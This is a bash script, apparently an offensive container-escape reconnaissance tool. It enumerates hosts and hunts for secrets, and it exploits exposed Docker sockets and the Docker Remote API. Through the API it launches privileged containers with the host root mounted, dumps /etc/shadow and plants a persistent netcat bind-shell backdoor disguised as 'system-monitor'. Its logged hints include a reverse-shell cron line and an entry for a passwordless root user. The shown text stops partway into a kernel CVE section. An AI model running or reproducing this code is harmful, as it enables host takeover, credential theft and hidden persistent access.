#!/bin/bash

echo -e ""
echo -e "\033[34m===============================================================\033[0m"
echo -e "\033[34m        Advanced Container Escape Reconnaissance v1.0          \033[0m"
echo -e "\033[34m---------------------------------------------------------------\033[0m"
echo -e "\033[34m                     Author:  TeamsSix/TerminalSin                         \033[0m"
echo -e "\033[34m===============================================================\033[0m"
echo -e ""

# Global variables
VulnerabilityExists=0
RECONNAISSANCE_DIR="/tmp/.container-recon"
RESULTS_DIR="./results"
LOG_FILE="$RECONNAISSANCE_DIR/recon.log"

# Create reconnaissance and results directories
mkdir -p "$RECONNAISSANCE_DIR" 2>/dev/null
mkdir -p "$RESULTS_DIR" 2>/dev/null

# Logging function
log_info() {
    echo -e "\033[36m[INFO]\033[0m $1" | tee -a "$LOG_FILE"
}

log_vuln() {
    echo -e "\033[92m[+]\033[0m $1" | tee -a "$LOG_FILE"
    VulnerabilityExists=1
}

log_warn() {
    echo -e "\033[93m[!]\033[0m $1" | tee -a "$LOG_FILE"
}

log_error() {
    echo -e "\033[31m[-]\033[0m $1" | tee -a "$LOG_FILE"
}

log_exploit() {
    echo -e "\033[95m[EXPLOIT]\033[0m $1" | tee -a "$LOG_FILE"
}

# Enhanced command checking and installation
CheckCommandExists(){
    command -v "$1" >/dev/null 2>&1
    return $?
}

InstallCommand(){
    if ! CheckCommandExists "$1"; then
        timeout 3 bash -c "echo -e >/dev/tcp/8.8.8.8/53" > /dev/null 2>&1 && IsNetWork=1 || IsNetWork=0
        if [ $IsNetWork -eq 1 ]; then
            log_warn "Installing missing command: $1"
            
            if CheckCommandExists apt-get; then
                case "$1" in
                    "capsh") sudo apt-get update -qq && sudo apt-get install -y libcap2-bin >/dev/null 2>&1 ;;
                    "nmap") sudo apt-get update -qq && sudo apt-get install -y nmap >/dev/null 2>&1 ;;
                    "ss") sudo apt-get update -qq && sudo apt-get install -y iproute2 >/dev/null 2>&1 ;;
                    *) sudo apt-get update -qq && sudo apt-get install -y "$1" >/dev/null 2>&1 ;;
                esac
            elif CheckCommandExists yum; then
                case "$1" in
                    "capsh") sudo yum install -y libcap >/dev/null 2>&1 ;;
                    "nmap") sudo yum install -y nmap >/dev/null 2>&1 ;;
                    "ss") sudo yum install -y iproute >/dev/null 2>&1 ;;
                    *) sudo yum install -y "$1" >/dev/null 2>&1 ;;
                esac
            fi
        fi
    fi
}

# System Information Gathering
GatherSystemInfo() {
    log_info "=== SYSTEM RECONNAISSANCE ==="
    
    echo "=== System Information ===" > "$RECONNAISSANCE_DIR/system_info.txt"
    {
        echo "Hostname: $(hostname 2>/dev/null || echo 'unknown')"
        echo "Kernel: $(uname -a 2>/dev/null || echo 'unknown')"
        echo "OS Release: $(cat /etc/os-release 2>/dev/null | head -5 || echo 'unknown')"
        echo "Uptime: $(uptime 2>/dev/null || echo 'unknown')"
        echo "Current User: $(whoami 2>/dev/null || echo 'unknown')"
        echo "User ID: $(id 2>/dev/null || echo 'unknown')"
        echo "Groups: $(groups 2>/dev/null || echo 'unknown')"
    } >> "$RECONNAISSANCE_DIR/system_info.txt"
    
    log_info "System information saved to $RECONNAISSANCE_DIR/system_info.txt"
}

# Network Reconnaissance
NetworkReconnaissance() {
    log_info "=== NETWORK RECONNAISSANCE ==="
    
    echo "=== Network Information ===" > "$RECONNAISSANCE_DIR/network_info.txt"
    {
        echo "--- Network Interfaces ---"
        ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "No network interface info available"
        
        echo -e "\n--- Routing Table ---"
        ip route show 2>/dev/null || route 2>/dev/null || echo "No routing info available"
        
        echo -e "\n--- DNS Configuration ---"
        cat /etc/resolv.conf 2>/dev/null || echo "No DNS info available"
        
        echo -e "\n--- Network Connections ---"
        ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null || echo "No network connection info available"
        
        echo -e "\n--- ARP Table ---"
        ip neigh show 2>/dev/null || arp -a 2>/dev/null || echo "No ARP info available"
    } >> "$RECONNAISSANCE_DIR/network_info.txt"
    
    # Port scanning on gateway
    if CheckCommandExists nmap || InstallCommand nmap; then
        GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
        if [ -n "$GATEWAY" ]; then
            log_info "Scanning gateway $GATEWAY for common services..."
            nmap -sT -p 22,80,443,2375,2376,8080,9000 "$GATEWAY" 2>/dev/null > "$RECONNAISSANCE_DIR/gateway_scan.txt" || echo "Gateway scan failed" > "$RECONNAISSANCE_DIR/gateway_scan.txt"
        fi
    fi
    
    log_info "Network reconnaissance saved to $RECONNAISSANCE_DIR/network_info.txt"
}

# Process and Namespace Analysis
ProcessAnalysis() {
    log_info "=== PROCESS AND NAMESPACE ANALYSIS ==="
    
    echo "=== Process Information ===" > "$RECONNAISSANCE_DIR/process_info.txt"
    {
        echo "--- Running Processes ---"
        ps aux 2>/dev/null || ps -ef 2>/dev/null || echo "No process info available"
        
        echo -e "\n--- Process Tree ---"
        pstree 2>/dev/null || echo "pstree not available"
        
        echo -e "\n--- Current Process Namespaces ---"
        ls -la /proc/self/ns/ 2>/dev/null || echo "No namespace info available"
        
        echo -e "\n--- Init Process Cgroup ---"
        cat /proc/1/cgroup 2>/dev/null || echo "No cgroup info available"
        
        echo -e "\n--- Current Process Cgroup ---"
        cat /proc/self/cgroup 2>/dev/null || echo "No cgroup info available"
        
        echo -e "\n--- Mount Namespaces ---"
        cat /proc/self/mountinfo 2>/dev/null || echo "No mountinfo available"
    } >> "$RECONNAISSANCE_DIR/process_info.txt"
    
    log_info "Process analysis saved to $RECONNAISSANCE_DIR/process_info.txt"
}

# File System Reconnaissance
FileSystemReconnaissance() {
    log_info "=== FILESYSTEM RECONNAISSANCE ==="
    
    echo "=== Filesystem Information ===" > "$RECONNAISSANCE_DIR/filesystem_info.txt"
    {
        echo "--- Mount Points ---"
        mount 2>/dev/null || cat /proc/mounts 2>/dev/null || echo "No mount info available"
        
        echo -e "\n--- Disk Usage ---"
        df -h 2>/dev/null || echo "No disk usage info available"
        
        echo -e "\n--- Writable Directories ---"
        find / -type d -writable 2>/dev/null | head -20 || echo "No writable directories found"
        
        echo -e "\n--- SUID Files ---"
        find / -type f -perm -4000 2>/dev/null | head -20 || echo "No SUID files found"
        
        echo -e "\n--- SGID Files ---"
        find / -type f -perm -2000 2>/dev/null | head -20 || echo "No SGID files found"
        
        echo -e "\n--- World Writable Files ---"
        find / -type f -perm -002 2>/dev/null | head -20 || echo "No world writable files found"
        
        echo -e "\n--- Interesting Files ---"
        find / -name "*.key" -o -name "*.pem" -o -name "*.crt" -o -name "*password*" -o -name "*secret*" 2>/dev/null | head -20 || echo "No interesting files found"
    } >> "$RECONNAISSANCE_DIR/filesystem_info.txt"
    
    log_info "Filesystem reconnaissance saved to $RECONNAISSANCE_DIR/filesystem_info.txt"
}

# Comprehensive Capability Analysis
ComprehensiveCapabilityAnalysis() {
    log_info "=== COMPREHENSIVE CAPABILITY ANALYSIS ==="
    
    InstallCommand capsh
    
    if CheckCommandExists capsh; then
        echo "=== Capability Analysis ===" > "$RECONNAISSANCE_DIR/capabilities.txt"
        {
            echo "--- Current Process Capabilities ---"
            capsh --print
            
            echo -e "\n--- Capability Explanations ---"
            capsh --print | grep "cap_" | while read -r cap; do
                case "$cap" in
                    *cap_dac_override*) 
                        echo "CAP_DAC_OVERRIDE: Bypass file read, write, and execute permission checks"
                        log_vuln "CAP_DAC_OVERRIDE found - Can bypass file permissions!"
                        log_exploit "Use to read/write any file: echo 'data' > /host/etc/passwd" 
                        ;;
                    *cap_dac_read_search*)
                        echo "CAP_DAC_READ_SEARCH: Bypass file read permission checks and directory read/execute"
                        log_vuln "CAP_DAC_READ_SEARCH found - Can read any file!"
                        log_exploit "Use to read sensitive files: cat /host/etc/shadow"
                        ;;
                    *cap_sys_admin*)
                        echo "CAP_SYS_ADMIN: Perform various system administration operations"
                        log_vuln "CAP_SYS_ADMIN found - Powerful administrative capability!"
                        log_exploit "Can mount filesystems, modify namespaces, etc."
                        log_exploit "mount /dev/sda1 /mnt # Mount host filesystem"
                        ;;
                    *cap_sys_ptrace*)
                        echo "CAP_SYS_PTRACE: Trace arbitrary processes using ptrace()"
                        log_vuln "CAP_SYS_PTRACE found - Can debug and inject into processes!"
                        log_exploit "gdb -p \$(pidof init) # Attach to init process"
                        ;;
                    *cap_sys_module*)
                        echo "CAP_SYS_MODULE: Load and unload kernel modules"
                        log_vuln "CAP_SYS_MODULE found - Can load kernel modules!"
                        log_exploit "insmod malicious.ko # Load malicious kernel module"
                        ;;
                    *cap_sys_chroot*)
                        echo "CAP_SYS_CHROOT: Use chroot()"
                        log_vuln "CAP_SYS_CHROOT found - Can escape chroot jails!"
                        ;;
                    *cap_sys_boot*)
                        echo "CAP_SYS_BOOT: Use reboot() and kexec_load()"
                        log_vuln "CAP_SYS_BOOT found - Can reboot system!"
                        ;;
                    *cap_setuid*)
                        echo "CAP_SETUID: Make arbitrary changes to process UIDs"
                        log_vuln "CAP_SETUID found - Can change to any user!"
                        log_exploit "setuid(0); # Become root"
                        ;;
                    *cap_setgid*)
                        echo "CAP_SETGID: Make arbitrary changes to process GIDs"
                        log_vuln "CAP_SETGID found - Can change to any group!"
                        ;;
                    *cap_net_admin*)
                        echo "CAP_NET_ADMIN: Perform various network-related operations"
                        log_vuln "CAP_NET_ADMIN found - Can modify network configuration!"
                        ;;
                    *cap_net_raw*)
                        echo "CAP_NET_RAW: Use RAW and PACKET sockets"
                        log_vuln "CAP_NET_RAW found - Can craft raw packets!"
                        ;;
                esac
            done
        } >> "$RECONNAISSANCE_DIR/capabilities.txt"
        
        log_info "Capability analysis saved to $RECONNAISSANCE_DIR/capabilities.txt"
    else
        log_warn "capsh command not available for capability analysis"
    fi
}

# Check Current Environment
CheckTheCurrentEnvironment(){
    log_info "=== ENVIRONMENT DETECTION ==="
    
    if [ ! -f "/proc/1/cgroup" ]; then
        IsContainer=0
    else
        if grep -qi docker /proc/1/cgroup 2>/dev/null; then
            IsContainer=1
            ContainerType="Docker"
        elif grep -qi lxc /proc/1/cgroup 2>/dev/null; then
            IsContainer=1
            ContainerType="LXC"
        elif grep -qi containerd /proc/1/cgroup 2>/dev/null; then
            IsContainer=1
            ContainerType="Containerd"
        elif [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
            IsContainer=1
            ContainerType="Kubernetes"
        else
            IsContainer=1
            ContainerType="Unknown"
        fi
    fi

    if [ $IsContainer -eq 0 ]; then
        log_error "Not currently in a container environment"
        exit 1
    else
        log_info "Container environment detected: $ContainerType"
        VulnerabilityExists=0
        
        # Gather additional container info
        echo "=== Container Information ===" > "$RECONNAISSANCE_DIR/container_info.txt"
        {
            echo "Container Type: $ContainerType"
            echo "Container ID: $(cat /proc/self/cgroup | head -1 | sed 's/.*\///' | cut -c1-12 2>/dev/null || echo 'unknown')"
            echo "Container Runtime: $(cat /proc/1/cgroup 2>/dev/null || echo 'unknown')"
            
            if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
                echo "Kubernetes Service Account Token: Present"
                echo "Kubernetes Namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo 'unknown')"
            fi
        } >> "$RECONNAISSANCE_DIR/container_info.txt"
    fi
}

# Enhanced Privileged Mode Check
CheckPrivilegedMode(){
    log_info "=== PRIVILEGED MODE ANALYSIS ==="
    
    IsPrivilegedMode=0
    if [ -f "/proc/self/status" ]; then
        CAPS=$(grep CapEff /proc/self/status | awk '{print $2}')
        case "$CAPS" in
            "0000003fffffffff"|"0000001fffffffff"|"000001ffffffffff")
                IsPrivilegedMode=1
                ;;
        esac
    fi

    if [ $IsPrivilegedMode -eq 1 ]; then
        log_vuln "Container running in PRIVILEGED MODE!"
        log_exploit "Privileged containers can:"
        log_exploit "1. Access all host devices in /dev"
        log_exploit "2. Mount host filesystem: mount /dev/sda1 /mnt"
        log_exploit "3. Load kernel modules: insmod malicious.ko"
        log_exploit "4. Modify host network: iptables rules"
        log_exploit "5. Access host processes via /proc"
        
        # Check accessible devices
        echo "=== Privileged Mode Analysis ===" > "$RECONNAISSANCE_DIR/privileged_analysis.txt"
        {
            echo "--- Accessible Devices ---"
            ls -la /dev/ 2>/dev/null | head -20
            
            echo -e "\n--- Block Devices ---"
            lsblk 2>/dev/null || echo "lsblk not available"
            
            echo -e "\n--- Loadable Modules ---"
            lsmod 2>/dev/null | head -10 || echo "lsmod not available"
        } >> "$RECONNAISSANCE_DIR/privileged_analysis.txt"
    else
        log_info "Container not running in privileged mode"
    fi
}

# Enhanced Docker Socket Check
CheckDockerSocketMount(){
    log_info "=== DOCKER SOCKET ANALYSIS ==="
    
    IsDockerSocketMount=0
    DOCKER_SOCKETS=("/var/run/docker.sock" "/run/docker.sock" "/tmp/docker.sock")
    
    for socket in "${DOCKER_SOCKETS[@]}"; do
        if [ -S "$socket" ]; then
            IsDockerSocketMount=1
            log_vuln "Docker socket found: $socket"
            
            # Test socket accessibility
            if [ -r "$socket" ] && [ -w "$socket" ]; then
                log_exploit "Socket is readable and writable!"
                log_exploit "Exploit commands:"
                log_exploit "1. List containers: docker -H unix://$socket ps -a"
                log_exploit "2. Run privileged container: docker -H unix://$socket run --privileged -v /:/host -it alpine chroot /host /bin/bash"
                log_exploit "3. Execute in existing container: docker -H unix://$socket exec -it \$CONTAINER_ID /bin/bash"
                
                # Try to gather Docker info
                if CheckCommandExists docker; then
                    echo "=== Docker Socket Analysis ===" > "$RECONNAISSANCE_DIR/docker_analysis.txt"
                    {
                        echo "--- Docker Version ---"
                        docker -H "unix://$socket" version 2>/dev/null || echo "Cannot get Docker version"
                        
                        echo -e "\n--- Docker Info ---"
                        docker -H "unix://$socket" info 2>/dev/null || echo "Cannot get Docker info"
                        
                        echo -e "\n--- Running Containers ---"
                        docker -H "unix://$socket" ps 2>/dev/null || echo "Cannot list containers"
                        
                        echo -e "\n--- All Containers ---"
                        docker -H "unix://$socket" ps -a 2>/dev/null || echo "Cannot list all containers"
                        
                        echo -e "\n--- Images ---"
                        docker -H "unix://$socket" images 2>/dev/null || echo "Cannot list images"
                        
                        echo -e "\n--- Networks ---"
                        docker -H "unix://$socket" network ls 2>/dev/null || echo "Cannot list networks"
                        
                        echo -e "\n--- Volumes ---"
                        docker -H "unix://$socket" volume ls 2>/dev/null || echo "Cannot list volumes"
                    } >> "$RECONNAISSANCE_DIR/docker_analysis.txt"
                fi
            else
                log_warn "Socket found but not accessible"
            fi
        fi
    done
    
    if [ $IsDockerSocketMount -eq 0 ]; then
        log_info "No Docker socket mounted"
    fi
}

# Enhanced Procfs Check
CheckProcfsMount(){
    log_info "=== PROCFS MOUNT ANALYSIS ==="
    
    # Check for multiple core_pattern files (indicating host procfs mount)
    CORE_PATTERN_COUNT=$(find / -name core_pattern 2>/dev/null | wc -l)
    
    if [ "$CORE_PATTERN_COUNT" -gt 1 ]; then
        log_vuln "Host procfs appears to be mounted (found $CORE_PATTERN_COUNT core_pattern files)"
        
        echo "=== Procfs Analysis ===" > "$RECONNAISSANCE_DIR/procfs_analysis.txt"
        {
            echo "--- Core Pattern Files ---"
            find / -name core_pattern 2>/dev/null
            
            echo -e "\n--- Procfs Mount Points ---"
            mount | grep proc || echo "No proc mounts visible"
            
            echo -e "\n--- Host Process Tree Access ---"
            # Try to access host processes
            for pid in 1 2 $(seq 1 100); do
                if [ -d "/proc/$pid" ] && [ -f "/proc/$pid/cmdline" ]; then
                    cmdline=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr '\0' ' ')
                    if [ -n "$cmdline" ]; then
                        echo "PID $pid: $cmdline"
                    fi
                fi
            done | head -20
        } >> "$RECONNAISSANCE_DIR/procfs_analysis.txt"
        
        log_exploit "Exploitation methods:"
        log_exploit "1. Read host processes: cat /proc/1/environ"
        log_exploit "2. Access host cgroups: cat /proc/1/cgroup"
        log_exploit "3. Core dump exploitation: echo '|/path/to/script' > /proc/sys/kernel/core_pattern"
    else
        log_info "Procfs mount appears normal"
    fi
}

# Enhanced Root Directory Mount Check
CheckRootDirectoryMount(){
    log_info "=== ROOT DIRECTORY MOUNT ANALYSIS ==="
    
    # Look for signs of host root filesystem mount
    HOST_INDICATORS=()
    
    # Check for multiple passwd files
    PASSWD_COUNT=$(find / -name passwd 2>/dev/null | grep -c /etc/passwd)
    if [ "$PASSWD_COUNT" -gt 6 ]; then
        HOST_INDICATORS+=("Multiple passwd files: $PASSWD_COUNT")
    fi
    
    # Check for common host paths
    if [ -d "/host" ]; then
        HOST_INDICATORS+=("Suspicious /host directory exists")
    fi
    
    # Check for host boot directory
    if [ -d "/boot" ] && [ "$(ls -A /boot 2>/dev/null | wc -l)" -gt 0 ]; then
        HOST_INDICATORS+=("Host /boot directory accessible")
    fi
    
    # Check for host proc
    if [ -f "/proc/version" ] && [ -f "/host/proc/version" ]; then
        HOST_INDICATORS+=("Both container and host /proc accessible")
    fi
    
    if [ ${#HOST_INDICATORS[@]} -gt 0 ]; then
        log_vuln "Host root filesystem appears to be mounted!"
        
        echo "=== Root Directory Mount Analysis ===" > "$RECONNAISSANCE_DIR/rootfs_analysis.txt"
        {
            echo "--- Indicators Found ---"
            for indicator in "${HOST_INDICATORS[@]}"; do
                echo "- $indicator"
            done
            
            echo -e "\n--- Potential Host Directories ---"
            for dir in /host /mnt /media /tmp /var/lib; do
                if [ -d "$dir" ]; then
                    echo "Checking $dir:"
                    ls -la "$dir" 2>/dev/null | head -10
                    echo ""
                fi
            done
            
            echo -e "\n--- Host System Files ---"
            for file in /etc/passwd /etc/shadow /etc/hostname /etc/hosts; do
                if [ -f "$file" ]; then
                    echo "=== $file ==="
                    cat "$file" 2>/dev/null | head -10
                    echo ""
                fi
            done
        } >> "$RECONNAISSANCE_DIR/rootfs_analysis.txt"
        
        log_exploit "Exploitation methods:"
        log_exploit "1. Write to host files: echo 'user::0:0::/root:/bin/bash' >> /host/etc/passwd"
        log_exploit "2. Add SSH keys: echo 'pubkey' >> /host/root/.ssh/authorized_keys"
        log_exploit "3. Modify host cron: echo '* * * * * /bin/bash -i >& /dev/tcp/IP/PORT 0>&1' >> /host/etc/crontab"
        
        for indicator in "${HOST_INDICATORS[@]}"; do
            log_vuln "$indicator"
        done
    else
        log_info "No host root directory mount detected"
    fi
}

# Enhanced Docker Remote API Check
CheckDockerRemoteAPI(){
    log_info "=== DOCKER REMOTE API ANALYSIS ==="
    
    InstallCommand hostname
    
    # Get possible gateway IPs
    GATEWAY_IPS=()
    GATEWAY_IPS+=($(ip route | grep default | awk '{print $3}' 2>/dev/null))
    GATEWAY_IPS+=($(hostname -i 2>/dev/null | awk -F. '{print $1 "." $2 "." $3 ".1"}'))
    GATEWAY_IPS+=("172.17.0.1" "172.18.0.1" "10.0.0.1" "192.168.1.1")
    
    # Remove duplicates
    GATEWAY_IPS=($(printf "%s\n" "${GATEWAY_IPS[@]}" | sort -u))
    
    DockerRemoteAPIFound=0
    
    echo "=== Docker Remote API Analysis ===" > "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
    echo "--- Testing Docker Remote API on gateways ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
    
    for IP in "${GATEWAY_IPS[@]}"; do
        if [ -n "$IP" ]; then
            for PORT in "2375" "2376"; do
                echo "Testing $IP:$PORT..." >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                
                if timeout 3 bash -c "echo -e >/dev/tcp/$IP/$PORT" 2>/dev/null; then
                    log_vuln "Docker Remote API accessible on $IP:$PORT"
                    DockerRemoteAPIFound=1
                    
                    # Install curl if not available
                    InstallCommand curl
                    
                    if CheckCommandExists curl; then
                        echo "--- API Response from $IP:$PORT ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                        
                        # Get Docker version and info
                        log_info "Gathering Docker API information from $IP:$PORT..."
                        curl -s "http://$IP:$PORT/version" 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "No version response" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                        curl -s "http://$IP:$PORT/info" 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "No info response" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                        
                        # List containers
                        log_info "Listing containers via Docker API..."
                        CONTAINERS_RESPONSE=$(curl -s "http://$IP:$PORT/containers/json?all=true" 2>/dev/null)
                        if [ -n "$CONTAINERS_RESPONSE" ] && [ "$CONTAINERS_RESPONSE" != "null" ]; then
                            echo -e "\n--- Container List (All) ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                            echo "$CONTAINERS_RESPONSE" | python3 -m json.tool 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "$CONTAINERS_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                            log_vuln "Successfully retrieved container list from Docker API"
                            
                            # Extract container info
                            CONTAINER_COUNT=$(echo "$CONTAINERS_RESPONSE" | grep -o '"Id"' | wc -l 2>/dev/null || echo "0")
                            log_info "Found $CONTAINER_COUNT containers on Docker API"
                        else
                            echo "No containers found or API error" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                            log_warn "Could not retrieve container list from Docker API"
                        fi
                        
                        # List running containers
                        RUNNING_CONTAINERS=$(curl -s "http://$IP:$PORT/containers/json" 2>/dev/null)
                        if [ -n "$RUNNING_CONTAINERS" ] && [ "$RUNNING_CONTAINERS" != "null" ]; then
                            echo -e "\n--- Running Containers ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                            echo "$RUNNING_CONTAINERS" | python3 -m json.tool 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "$RUNNING_CONTAINERS" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                        fi
                        
                        # List images
                        IMAGES_RESPONSE=$(curl -s "http://$IP:$PORT/images/json" 2>/dev/null)
                        if [ -n "$IMAGES_RESPONSE" ] && [ "$IMAGES_RESPONSE" != "null" ]; then
                            echo -e "\n--- Available Images ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                            echo "$IMAGES_RESPONSE" | python3 -m json.tool 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "$IMAGES_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                        fi
                        
                        # Attempt to create privileged container
                        log_info "Attempting to create privileged escape container..."
                        
                        # First check if alpine image exists, if not try common images
                        AVAILABLE_IMAGES=$(echo "$IMAGES_RESPONSE" | grep -o '"RepoTags":\[[^]]*\]' | head -5)
                        
                        # Try different base images
                        for IMAGE in "alpine:latest" "ubuntu:latest" "busybox:latest" "debian:latest"; do
                            log_info "Attempting container creation with image: $IMAGE"
                            
                            # Create privileged container payload
                            CONTAINER_PAYLOAD='{
                                "Image": "'$IMAGE'",
                                "Cmd": ["/bin/sh", "-c", "echo Container_Escape_Test_$(date) > /host/tmp/container_escape_proof.txt && cat /host/etc/passwd | head -5 > /host/tmp/host_passwd_dump.txt && ps aux > /host/tmp/host_processes.txt"],
                                "WorkingDir": "/",
                                "HostConfig": {
                                    "Privileged": true,
                                    "Binds": ["/:/host"],
                                    "NetworkMode": "host",
                                    "PidMode": "host",
                                    "AutoRemove": true
                                },
                                "NetworkDisabled": false
                            }'
                            
                            # Create container
                            CREATE_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/create" \
                                -H "Content-Type: application/json" \
                                -d "$CONTAINER_PAYLOAD" 2>/dev/null)
                            
                            if [ -n "$CREATE_RESPONSE" ]; then
                                echo -e "\n--- Container Creation Attempt with $IMAGE ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                                echo "$CREATE_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                                
                                # Extract container ID
                                CONTAINER_ID=$(echo "$CREATE_RESPONSE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4 | head -1)
                                
                                if [ -n "$CONTAINER_ID" ] && [ ${#CONTAINER_ID} -gt 10 ]; then
                                    log_vuln "✅ Successfully created privileged container: $CONTAINER_ID"
                                    
                                    # Start the container
                                    log_info "Starting privileged container..."
                                    START_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/$CONTAINER_ID/start" 2>/dev/null)
                                    
                                    if [ $? -eq 0 ]; then
                                        log_vuln "✅ Successfully started privileged container!"
                                        log_exploit "Container $CONTAINER_ID is running with full host access!"
                                        log_exploit "Check /tmp/container_escape_proof.txt on host for evidence"
                                        
                                        # Wait a moment for container to execute
                                        sleep 2
                                        
                                        # Get container logs
                                        log_info "Retrieving container execution logs..."
                                        LOGS_RESPONSE=$(curl -s "http://$IP:$PORT/containers/$CONTAINER_ID/logs?stdout=true&stderr=true" 2>/dev/null)
                                        if [ -n "$LOGS_RESPONSE" ]; then
                                            echo -e "\n--- Container Execution Logs ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                                            echo "$LOGS_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                                        fi
                                        
                                        # Try to execute additional commands in the container
                                        log_info "Attempting command execution in privileged container..."
                                        EXEC_PAYLOAD='{"Cmd": ["chroot", "/host", "/bin/bash", "-c", "whoami && id && ls -la /root"], "AttachStdout": true, "AttachStderr": true}'
                                        EXEC_CREATE_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/$CONTAINER_ID/exec" \
                                            -H "Content-Type: application/json" \
                                            -d "$EXEC_PAYLOAD" 2>/dev/null)
                                        
                                        if [ -n "$EXEC_CREATE_RESPONSE" ]; then
                                            EXEC_ID=$(echo "$EXEC_CREATE_RESPONSE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
                                            if [ -n "$EXEC_ID" ]; then
                                                log_info "Executing commands as host root via container..."
                                                EXEC_START_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/exec/$EXEC_ID/start" \
                                                    -H "Content-Type: application/json" \
                                                    -d '{"Detach": false}' 2>/dev/null)
                                                
                                                echo -e "\n--- Root Command Execution Results ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                                                echo "$EXEC_START_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
                                                
                                                if [ -n "$EXEC_START_RESPONSE" ]; then
                                                    log_vuln "🚨 CRITICAL: Successfully executed commands as host root!"
                                                fi
                                            fi
                                        fi
                                        
                                        # Create additional evidence files
                                        EVIDENCE_PAYLOAD='{"Cmd": ["chroot", "/host", "/bin/bash", "-c", "echo CONTAINER_ESCAPE_SUCCESS_$(date) > /tmp/escape_evidence.txt && cp /etc/shadow /tmp/shadow_dump.txt 2>/dev/null || echo shadow_access_failed"], "AttachStdout": true, "AttachStderr": true}'
                                        EVIDENCE_EXEC_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/$CONTAINER_ID/exec" \
                                            -H "Content-Type: application/json" \
                                            -d "$EVIDENCE_PAYLOAD" 2>/dev/null)
                                        
                                        log_exploit "EXPLOITATION SUCCESSFUL! Privileged container escape completed."
                                        log_exploit "Evidence files created on host in /tmp/"
                                        log_exploit "Container ID: $CONTAINER_ID"
                                        
                                        break  # Successfully created container, no need to try other images
                                    else
                                        log_warn "Container created but failed to start"
                                    fi
                                else
                                    log_warn "Container creation failed for image $IMAGE"
                                fi
                            else
                                log_warn "No response when attempting to create container with $IMAGE"
                            fi
                        done
                        
                        # Create backdoor container for persistent access
                        log_info "Attempting to create persistent backdoor container..."
                        BACKDOOR_PAYLOAD='{
                            "Image": "alpine:latest",
                            "Cmd": ["/bin/sh", "-c", "while true; do nc -l -p 9999 -e /bin/sh; done"],
                            "ExposedPorts": {"9999/tcp": {}},
                            "HostConfig": {
                                "Privileged": true,
                                "Binds": ["/:/host"],
                                "PortBindings": {"9999/tcp": [{"HostPort": "9999"}]},
                                "RestartPolicy": {"Name": "always"}
                            }
                        }'
                        
                        BACKDOOR_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/create?name=system-monitor" \
                            -H "Content-Type: application/json" \
                            -d "$BACKDOOR_PAYLOAD" 2>/dev/null)
                        
                        if [ -n "$BACKDOOR_RESPONSE" ]; then
                            BACKDOOR_ID=$(echo "$BACKDOOR_RESPONSE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
                            if [ -n "$BACKDOOR_ID" ]; then
                                log_info "Starting persistent backdoor container..."
                                curl -s -X POST "http://$IP:$PORT/containers/$BACKDOOR_ID/start" >/dev/null 2>&1
                                log_exploit "Backdoor container created: $BACKDOOR_ID (listening on port 9999)"
                            fi
                        fi
                        
                    else
                        log_warn "curl not available for Docker API exploitation"
                    fi
                    
                    log_exploit "Manual exploitation methods for $IP:$PORT:"
                    log_exploit "1. List containers: curl http://$IP:$PORT/containers/json?all=true"
                    log_exploit "2. Create privileged container:"
                    log_exploit "   curl -X POST http://$IP:$PORT/containers/create -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\"]}}'"
                    log_exploit "3. Start container: curl -X POST http://$IP:$PORT/containers/\$ID/start"
                    log_exploit "4. Execute commands: curl -X POST http://$IP:$PORT/containers/\$ID/exec"
                fi
            done
        fi
    done
    
    if [ $DockerRemoteAPIFound -eq 0 ]; then
        log_info "No Docker Remote API endpoints found"
        echo "No accessible Docker API endpoints found" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
    fi
}

# Enhanced CVE Checks with detailed analysis
LinuxKernelVersion=`uname -r | awk -F '-' '{print $1}'`
KernelVersion=`echo -e $LinuxKernelVersion | awk -F '.' '{print $1}'`
MajorRevision=`echo -e $LinuxKernelVersion | awk -F '.' '{print $2}'`
